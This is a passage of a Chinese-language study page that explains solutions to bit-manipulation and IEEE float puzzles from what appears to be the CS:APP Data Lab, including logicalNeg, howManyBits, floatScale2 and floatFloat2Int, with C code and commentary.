</span><span id=__span-8-6><a id=__codelineno-8-6 name=__codelineno-8-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>~</span><span class=n>notZero</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>               </span><span class=c1>// 当notZero为1时，flag为0xffffffff，否则为0x00000000</span>
</span><span id=__span-8-7><a id=__codelineno-8-7 name=__codelineno-8-7></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>less</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w> </span><span class=c1>// x&lt;y时，less为1，否则为0，但需要注意，当x和y符号不同时，直接计算可能导致溢出，所以需要判断符号不同的情况</span>
</span><span id=__span-8-8><a id=__codelineno-8-8 name=__codelineno-8-8></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>y</span><span class=p>))</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>((</span><span class=n>flag</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>flagx</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>flag</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>less</span><span class=p>));</span>
</span><span id=__span-8-9><a id=__codelineno-8-9 name=__codelineno-8-9></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=logicalneg><code>logicalNeg</code><a class=headerlink href=#logicalneg title="Permanent link">¶</a></h3> <p>逻辑取反操作：!x 。</p> <ul> <li>当 x 为 0 时：0 | (~0 + 1) = 0 | 0 = 0，右移 31 位后得到 0，加1后得到 1</li> <li>当 x 不为 0 时：这会产生一个符号位为 1的数，右移 31 位后得到 0xFFFFFFFF，加1后得到 0</li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-9-1>1</a></span>
<span class=normal><a href=#__codelineno-9-2>2</a></span>
<span class=normal><a href=#__codelineno-9-3>3</a></span>
<span class=normal><a href=#__codelineno-9-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-9-1><a id=__codelineno-9-1 name=__codelineno-9-1></a><span class=kt>int</span><span class=w> </span><span class=nf>logicalNeg</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-9-2><a id=__codelineno-9-2 name=__codelineno-9-2></a><span class=p>{</span>
</span><span id=__span-9-3><a id=__codelineno-9-3 name=__codelineno-9-3></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>((</span><span class=n>x</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-9-4><a id=__codelineno-9-4 name=__codelineno-9-4></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=howmanybits><code>howManyBits</code><a class=headerlink href=#howmanybits title="Permanent link">¶</a></h3> <p>计算需要多少位来表示一个整数：</p> <ul> <li>当x为正数时，假设idx表示为1的最高的位置，答案即idx + 1。</li> <li>当x为负数时，我们将x取反，假设idx表示此时为1的最高的位置，答案即idx + 1。</li> <li>使用二分查找法确定最高有效位的位置</li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-10-1> 1</a></span>
<span class=normal><a href=#__codelineno-10-2> 2</a></span>
<span class=normal><a href=#__codelineno-10-3> 3</a></span>
<span class=normal><a href=#__codelineno-10-4> 4</a></span>
<span class=normal><a href=#__codelineno-10-5> 5</a></span>
<span class=normal><a href=#__codelineno-10-6> 6</a></span>
<span class=normal><a href=#__codelineno-10-7> 7</a></span>
<span class=normal><a href=#__codelineno-10-8> 8</a></span>
<span class=normal><a href=#__codelineno-10-9> 9</a></span>
<span class=normal><a href=#__codelineno-10-10>10</a></span>
<span class=normal><a href=#__codelineno-10-11>11</a></span>
<span class=normal><a href=#__codelineno-10-12>12</a></span>
<span class=normal><a href=#__codelineno-10-13>13</a></span>
<span class=normal><a href=#__codelineno-10-14>14</a></span>
<span class=normal><a href=#__codelineno-10-15>15</a></span>
<span class=normal><a href=#__codelineno-10-16>16</a></span>
<span class=normal><a href=#__codelineno-10-17>17</a></span>
<span class=normal><a href=#__codelineno-10-18>18</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-10-1><a id=__codelineno-10-1 name=__codelineno-10-1></a><span class=kt>int</span><span class=w> </span><span class=nf>howManyBits</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-10-2><a id=__codelineno-10-2 name=__codelineno-10-2></a><span class=p>{</span>
</span><span id=__span-10-3><a id=__codelineno-10-3 name=__codelineno-10-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>b16</span><span class=p>,</span><span class=w> </span><span class=n>b8</span><span class=p>,</span><span class=w> </span><span class=n>b4</span><span class=p>,</span><span class=w> </span><span class=n>b2</span><span class=p>,</span><span class=w> </span><span class=n>b1</span><span class=p>,</span><span class=w> </span><span class=n>b0</span><span class=p>;</span>
</span><span id=__span-10-4><a id=__codelineno-10-4 name=__codelineno-10-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>sign</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=p>;</span><span class=w>            </span><span class=c1>// 如果x为负数，则sign为0xffffffff，否则为0</span>
</span><span id=__span-10-5><a id=__codelineno-10-5 name=__codelineno-10-5></a><span class=w>    </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>sign</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=o>~</span><span class=n>x</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>sign</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>x</span><span class=p>);</span><span class=w> </span><span class=c1>// 如果x为负数，则取反，否则不变</span>
</span><span id=__span-10-6><a id=__codelineno-10-6 name=__codelineno-10-6></a><span class=w>    </span><span class=n>b16</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>16</span><span class=p>)</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w>        </span><span class=c1>// 查高 16 位是否有 1，如果有则 b16 = 16，否则为 0</span>
</span><span id=__span-10-7><a id=__codelineno-10-7 name=__codelineno-10-7></a><span class=w>    </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b16</span><span class=p>;</span>
</span><span id=__span-10-8><a id=__codelineno-10-8 name=__codelineno-10-8></a><span class=w>    </span><span class=n>b8</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>8</span><span class=p>)</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>3</span><span class=p>;</span><span class=w>          </span><span class=c1>// 查高 8 位是否有 1，如果有则 b8 = 8，否则为 0</span>
</span><span id=__span-10-9><a id=__codelineno-10-9 name=__codelineno-10-9></a><span class=w>    </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b8</span><span class=p>;</span>
</span><span id=__span-10-10><a id=__codelineno-10-10 name=__codelineno-10-10></a><span class=w>    </span><span class=n>b4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>4</span><span class=p>)</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>2</span><span class=p>;</span><span class=w>          </span><span class=c1>// 查高 4 位是否有 1，如果有则 b4 = 4，否则为 0</span>
</span><span id=__span-10-11><a id=__codelineno-10-11 name=__codelineno-10-11></a><span class=w>    </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b4</span><span class=p>;</span>
</span><span id=__span-10-12><a id=__codelineno-10-12 name=__codelineno-10-12></a><span class=w>    </span><span class=n>b2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>          </span><span class=c1>// 查高 2 位是否有 1，如果有则 b2 = 2，否则为 0</span>
</span><span id=__span-10-13><a id=__codelineno-10-13 name=__codelineno-10-13></a><span class=w>    </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b2</span><span class=p>;</span>
</span><span id=__span-10-14><a id=__codelineno-10-14 name=__codelineno-10-14></a><span class=w>    </span><span class=n>b1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w>               </span><span class=c1>// 查高 1 位是否有 1，如果有则 b1 = 1，否则为 0</span>
</span><span id=__span-10-15><a id=__codelineno-10-15 name=__codelineno-10-15></a><span class=w>    </span><span class=n>x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b1</span><span class=p>;</span>
</span><span id=__span-10-16><a id=__codelineno-10-16 name=__codelineno-10-16></a><span class=w>    </span><span class=n>b0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w>                        </span><span class=c1>// 查最低位是否有 1，如果有则 b0 = 1，否则为 0</span>
</span><span id=__span-10-17><a id=__codelineno-10-17 name=__codelineno-10-17></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>b16</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b8</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b4</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b2</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b0</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-10-18><a id=__codelineno-10-18 name=__codelineno-10-18></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=floatscale2><code>floatScale2</code><a class=headerlink href=#floatscale2 title="Permanent link">¶</a></h3> <p>计算浮点数的2倍：float x = 2.0 * x。</p> <p><img alt="alt text" src=../../img/image-116.png></p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-11-1> 1</a></span>
<span class=normal><a href=#__codelineno-11-2> 2</a></span>
<span class=normal><a href=#__codelineno-11-3> 3</a></span>
<span class=normal><a href=#__codelineno-11-4> 4</a></span>
<span class=normal><a href=#__codelineno-11-5> 5</a></span>
<span class=normal><a href=#__codelineno-11-6> 6</a></span>
<span class=normal><a href=#__codelineno-11-7> 7</a></span>
<span class=normal><a href=#__codelineno-11-8> 8</a></span>
<span class=normal><a href=#__codelineno-11-9> 9</a></span>
<span class=normal><a href=#__codelineno-11-10>10</a></span>
<span class=normal><a href=#__codelineno-11-11>11</a></span>
<span class=normal><a href=#__codelineno-11-12>12</a></span>
<span class=normal><a href=#__codelineno-11-13>13</a></span>
<span class=normal><a href=#__codelineno-11-14>14</a></span>
<span class=normal><a href=#__codelineno-11-15>15</a></span>
<span class=normal><a href=#__codelineno-11-16>16</a></span>
<span class=normal><a href=#__codelineno-11-17>17</a></span>
<span class=normal><a href=#__codelineno-11-18>18</a></span>
<span class=normal><a href=#__codelineno-11-19>19</a></span>
<span class=normal><a href=#__codelineno-11-20>20</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-11-1><a id=__codelineno-11-1 name=__codelineno-11-1></a><span class=kt>unsigned</span><span class=w> </span><span class=nf>floatScale2</span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=n>uf</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-11-2><a id=__codelineno-11-2 name=__codelineno-11-2></a><span class=p>{</span>
</span><span id=__span-11-3><a id=__codelineno-11-3 name=__codelineno-11-3></a><span class=w>    </span><span class=c1>// 先分别取符号 s，尾数 frac，和阶码 exp</span>
</span><span id=__span-11-4><a id=__codelineno-11-4 name=__codelineno-11-4></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>uf</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x1</span><span class=p>;</span>
</span><span id=__span-11-5><a id=__codelineno-11-5 name=__codelineno-11-5></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>exp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>uf</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>23</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=p>;</span>
</span><span id=__span-11-6><a id=__codelineno-11-6 name=__codelineno-11-6></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>frac</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>uf</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7FFFFF</span><span class=p>);</span>
</span><span id=__span-11-7><a id=__codelineno-11-7 name=__codelineno-11-7></a><span class=w>    </span><span class=c1>// NaN，根据题目要求，返回 uf</span>
</span><span id=__span-11-8><a id=__codelineno-11-8 name=__codelineno-11-8></a><span class=w>    </span><span class=k>if</span><span class=p>(</span><span class=n>exp</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xFF</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-11-9><a id=__codelineno-11-9 name=__codelineno-11-9></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>uf</span><span class=p>;</span>
</span><span id=__span-11-10><a id=__codelineno-11-10 name=__codelineno-11-10></a><span class=w>    </span><span class=c1>// 非规格化数，此时 frac 就是尾码，直接 frac &lt;&lt; 1 即可</span>
</span><span id=__span-11-11><a id=__codelineno-11-11 name=__codelineno-11-11></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>exp</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-11-12><a id=__codelineno-11-12 name=__codelineno-11-12></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-11-13><a id=__codelineno-11-13 name=__codelineno-11-13></a><span class=w>        </span><span class=n>frac</span><span class=w> </span><span class=o>&lt;&lt;=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-11-14><a id=__codelineno-11-14 name=__codelineno-11-14></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>s</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>31</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>exp</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>23</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>frac</span><span class=p>;</span>
</span><span id=__span-11-15><a id=__codelineno-11-15 name=__codelineno-11-15></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-11-16><a id=__codelineno-11-16 name=__codelineno-11-16></a><span class=w>    </span><span class=c1>// else</span>
</span><span id=__span-11-17><a id=__codelineno-11-17 name=__codelineno-11-17></a><span class=w>    </span><span class=c1>// 规格化数，此时exp != 0 &amp;&amp; != 255, 直接将阶码 exp 加 1 即可</span>
</span><span id=__span-11-18><a id=__codelineno-11-18 name=__codelineno-11-18></a><span class=w>    </span><span class=n>exp</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-11-19><a id=__codelineno-11-19 name=__codelineno-11-19></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>s</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>31</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>exp</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>23</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>frac</span><span class=p>;</span>
</span><span id=__span-11-20><a id=__codelineno-11-20 name=__codelineno-11-20></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=floatfloat2int><code>floatFloat2Int</code><a class=headerlink href=#floatfloat2int title="Permanent link">¶</a></h3> <p>计算浮点数的整数部分：int x = (int)uf。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-12-1> 1</a></span>
<span class=normal><a href=#__codelineno-12-2> 2</a></span>
<span class=normal><a href=#__codelineno-12-3> 3</a></span>
<span class=normal><a href=#__codelineno-12-4> 4</a></span>
<span class=normal><a href=#__codelineno-12-5> 5</a></span>
<span class=normal><a href=#__codelineno-12-6> 6</a></span>
<span class=normal><a href=#__codelineno-12-7> 7</a></span>
<span class=normal><a href=#__codelineno-12-8> 8</a></span>
<span class=normal><a href=#__codelineno-12-9> 9</a></span>
<span class=normal><a href=#__codelineno-12-10>10</a></span>
<span class=normal><a href=#__codelineno-12-11>11</a></span>
<span class=normal><a href=#__codelineno-12-12>12</a></span>
<span class=normal><a href=#__codelineno-12-13>13</a></span>
<span class=normal><a href=#__codelineno-12-14>14</a></span>
<span class=normal><a href=#__codelineno-12-15>15</a></span>
<span class=normal><a href=#__codelineno-12-16>16</a></span>
<span class=normal><a href=#__codelineno-12-17>17</a></span>
<span class=normal><a href=#__codelineno-12-18>18</a></span>
<span class=normal><a href=#__codelineno-12-19>19</a></span>
<span class=normal><a href=#__codelineno-12-20>20</a></span>
<span class=normal><a href=#__codelineno-12-21>21</a></span>
<span class=normal><a href=#__codelineno-12-22>22</a></span>
<span class=normal><a href=#__codelineno-12-23>23</a></span>
<span class=normal><a href=#__codelineno-12-24>24</a></span>
<span class=normal><a href=#__codelineno-12-25>25</a></span>
<span class=normal><a href=#__codelineno-12-26>26</a></span>
<span class=normal><a href=#__codelineno-12-27>27</a></span>
<span class=normal><a href=#__codelineno-12-28>28</a></span>
<span class=normal><a href=#__codelineno-12-29>29</a></span>
<span class=normal><a href=#__codelineno-12-30>30</a></span>
<span class=normal><a href=#__codelineno-12-31>31</a></span>
<span class=normal><a href=#__codelineno-12-32>32</a></span>
<span class=normal><a href=#__codelineno-12-33>33</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-12-1><a id=__codelineno-12-1 name=__codelineno-12-1></a><span class=kt>int</span><span class=w> </span><span class=nf>floatFloat2Int</span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=n>uf</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-12-2><a id=__codelineno-12-2 name=__codelineno-12-2></a><span class=p>{</span>
</span><span id=__span-12-3><a id=__codelineno-12-3 name=__codelineno-12-3></a><span class=w>    </span><span class=c1>// 先分别取符号 s，尾数 frac，和阶码 exp</span>
</span><span id=__span-12-4><a id=__codelineno-12-4 name=__codelineno-12-4></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>uf</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x1</span><span class=p>;</span>
</span><span id=__span-12-5><a id=__codelineno-12-5 name=__codelineno-12-5></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>exp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>uf</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>23</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xFF</span><span class=p>;</span>
</span><span id=__span-12-6><a id=__codelineno-12-6 name=__codelineno-12-6></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>frac</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>uf</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7FFFFF</span><span class=p>);</span>
</span><span id=__span-12-7><a id=__codelineno-12-7 name=__codelineno-12-7></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>E</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>exp</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>127</span><span class=p>;</span>
</span><span id=__span-12-8><a id=__codelineno-12-8 name=__codelineno-12-8></a><span class=w>    </span><span class=n>frac</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>frac</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>23</span><span class=p>);</span><span class=w> </span><span class=c1>// 添加隐含的1到尾数的最高位</span>
</span><span id=__span-12-9><a id=__codelineno-12-9 name=__codelineno-12-9></a><span class=w>    </span><span class=c1>// 非规格化数，此时，exp == 0，而 E = 1 - Bias = 1 - 127 = -126，表示浮点数的值在0到1之间。显然，return 0。</span>
</span><span id=__span-12-10><a id=__codelineno-12-10 name=__codelineno-12-10></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-12-11><a id=__codelineno-12-11 name=__codelineno-12-11></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-12-12><a id=__codelineno-12-12 name=__codelineno-12-12></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-12-13><a id=__codelineno-12-13 name=__codelineno-12-13></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-12-14><a id=__codelineno-12-14 name=__codelineno-12-14></a><span class=w>    </span><span class=c1>// infinity，返回0x80000000</span>
</span><span id=__span-12-15><a id=__codelineno-12-15 name=__codelineno-12-15></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>31</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-12-16><a id=__codelineno-12-16 name=__codelineno-12-16></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-12-17><a id=__codelineno-12-17 name=__codelineno-12-17></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mh>0x1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>31</span><span class=p>;</span>
</span><span id=__span-12-18><a id=__codelineno-12-18 name=__codelineno-12-18></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-12-19><a id=__codelineno-12-19 name=__codelineno-12-19></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=c1>// 此时，exp!=0 &amp;&amp; exp！=255。我们把 frac 作为基数进行修改，最后返回 frac</span>
</span><span id=__span-12-20><a id=__codelineno-12-20 name=__codelineno-12-20></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-12-21><a id=__codelineno-12-21 name=__codelineno-12-21></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>23</span><span class=p>)</span><span class=w> </span><span class=c1>// 浮点数的有效位部分超出了整数部分，需要右移去掉小数部分</span>
</span><span id=__span-12-22><a id=__codelineno-12-22 name=__codelineno-12-22></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-12-23><a id=__codelineno-12-23 name=__codelineno-12-23></a><span class=w>            </span><span class=n>frac</span><span class=w> </span><span class=o>&gt;&gt;=</span><span class=w> </span><span class=p>(</span><span class=mi>23</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>E</span><span class=p>);</span>
</span><span id=__span-12-24><a id=__codelineno-12-24 name=__codelineno-12-24></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-12-25><a id=__codelineno-12-25 name=__codelineno-12-25></a><span class=w>        </span><span class=k>else</span><span class=w>        </span><span class=c1>// 浮点数的有效位需要左移来正确表示整数部分</span>
</span><span id=__span-12-26><a id=__codelineno-12-26 name=__codelineno-12-26></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-12-27><a id=__codelineno-12-27 name=__codelineno-12-27></a><span class=w>            </span><span class=n>frac</span><span class=w> </span><span class=o>&lt;&lt;=</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>23</span><span class=p>);</span>
</span><span id=__span-12-28><a id=__codelineno-12-28 name=__codelineno-12-28></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-12-29><a id=__codelineno-12-29 name=__codelineno-12-29></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-12-30><a id=__codelineno-12-30 name=__codelineno-12-30></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=w>          </span><span class=c1>// 如果是负数，计算补码</span>
</span><span id=__span-12-31><a id=__codelineno-12-31 name=__codelineno-12-31></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=o>~</span><span class=n>frac</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-12-32><a id=__codelineno-12-32 name=__codelineno-12-32></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>frac</span><span class=p>;</span>
</span><span id=__span-12-33><a id=__codelineno-12-33 name=__codelineno-12-33></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=floatpower2><code>floatPower2</code><a class=headerlink href=#floatpower2 title="Permanent link">¶</a></h3> <p>计算2.0^x：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-13-1> 1</a></span>
<span class=normal><a href=#__codelineno-13-2> 2</a></span>
<span class=normal><a href=#__codelineno-13-3> 3</a></span>
<span class=normal><a href=#__codelineno-13-4> 4</a></span>
<span class=normal><a href=#__codelineno-13-5> 5</a></span>
<span class=normal><a href=#__codelineno-13-6> 6</a></span>
<span class=normal><a href=#__codelineno-13-7> 7</a></span>
<span class=normal><a href=#__codelineno-13-8> 8</a></span>
<span class=normal><a href=#__codelineno-13-9> 9</a></span>
<span class=normal><a href=#__codelineno-13-10>10</a></span>
<span class=normal><a href=#__codelineno-13-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-13-1><a id=__codelineno-13-1 name=__codelineno-13-1></a><span class=kt>unsigned</span><span class=w> </span><span class=nf>floatPower2</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-13-2><a id=__codelineno-13-2 name=__codelineno-13-2></a><span class=p>{</span>
</span><span id=__span-13-3><a id=__codelineno-13-3 name=__codelineno-13-3></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>-149</span><span class=p>)</span>
</span><span id=__span-13-4><a id=__codelineno-13-4 name=__codelineno-13-4></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
